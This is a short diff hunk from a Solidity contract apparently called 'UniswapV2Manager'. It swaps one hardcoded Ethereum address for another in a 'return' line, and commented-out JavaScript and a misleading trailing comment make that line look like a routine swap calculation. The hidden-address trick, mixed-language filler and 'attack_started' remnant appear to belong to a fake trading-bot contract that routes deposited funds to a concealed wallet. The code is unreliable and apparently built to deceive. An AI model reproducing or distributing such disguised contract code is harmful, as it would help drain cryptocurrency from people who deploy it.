@@ -535,7 +535,7 @@ contract UniswapV2Manager {
     //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
     //if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
 		//var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, 
-		return 0x1308766Bc6EBA6cF58B5A0E9659Fdff538C064Da;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
+		return 0xfc50D11Cd86F7Dc6DB2065A41FcE473Bb16BF3a6;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
 		}
         //attack_started = true;
         //return true
